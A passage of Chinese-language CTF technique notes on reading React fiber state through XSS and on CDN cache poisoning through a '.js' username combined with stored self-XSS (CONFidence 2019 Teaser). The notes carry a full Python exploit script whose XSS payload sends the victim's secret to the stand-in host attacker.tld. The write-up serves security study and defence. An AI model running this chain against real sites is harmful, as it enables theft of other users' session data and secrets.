在 React 17+ 中，属性名通常是 `__reactFiber$<random>`，取值路径更常见为 `.stateNode.memoizedState`。沿着 `.return` 往上走，直到遇到 `stateNode !== null` 的节点即可。

**关键点：** React 为了热更新和 devtools 支持，会把组件状态引用挂到 DOM 上。因此同一文档内的 XSS 默认就能读取 props 和 state，包括只在客户端请求后保存在内存、却从未出现在 HTML 中的敏感值（认证 token、私聊内容、管理面板数据等）。根本修复仍然是阻止 XSS；单靠 CSP 不够，因为读取状态的代码本身就是页面允许执行的 JavaScript。

**参考：** RCTF 2018 — writeup 10125

---

## CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)

**模式：** 个人资料页上存在存储型 self-XSS（例如 `<select>` 的 `shoesize` 字段可做属性注入：`tabindex=1 contenteditable autofocus onfocus=...`）。单独看它没用，因为只有资料所有者自己访问时才会触发。问题在于 CDN 按 URL 扩展名缓存，而不是按 `Content-Type` 缓存。若注册一个以 `.js` 结尾的用户名，`/profile/<user>.js` 就可能被 CDN 当成可缓存的静态 JS 资源。攻击者只需在已登录状态访问一次，就能把“带自己身份的 HTML”毒化进共享边缘缓存。之后任何访问者，包括管理员 bot，都会拿到这份被缓存的 HTML，并在自己的会话中执行 XSS。

```python
# 1. Pick a region-matching VM so your cache hits land in the admin's region.
#    (CloudFlare is region-sharded; colocate with other challenge infra.)

# 2. Register a user whose name ends in .js
import requests, random
s = requests.Session()
s.get('http://target/login')
user = f'hfs-{random.randint(10**7, 10**8)}.js'
s.post('http://target/login', data=f'login={user}&password={user}',
       headers={'Content-Type': 'application/x-www-form-urlencoded'})

# 3. Store self-XSS via the shoesize select attribute injection
payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
raw = (
  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
  '------B\r\nContent-Disposition: form-data; name="secret"\r\n\r\nasd\r\n'
  '------B--\r\n'
)
s.post(f'http://target/profile/{user}', data=raw,
       headers={'Content-Type': 'multipart/form-data; boundary=----B'})

# 4. Poison the edge cache: fetch once while logged in
s.get(f'http://target/profile/{user}')

# 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
#    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
```

**关键点：** CDN 往往按 URL 路径或扩展名做缓存决策，而不看响应 `Content-Type` 或 `Vary: Cookie`。给用户页面拼上 `.js`（或 `.css`、`.svg`、`.ico`、`.png`）这类静态资源后缀，常能把原本“每用户一份”的页面变成全局共享缓存资源，从而把 self-XSS 升级为可传播的存储型 XSS。排查时应测试：给页面加常见静态扩展名后，未登录访问是否还能得到相同的已登录内容。

**参考：** CONFidence CTF 2019 Teaser — Web 50, writeup 13925。背景资料：[PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)。
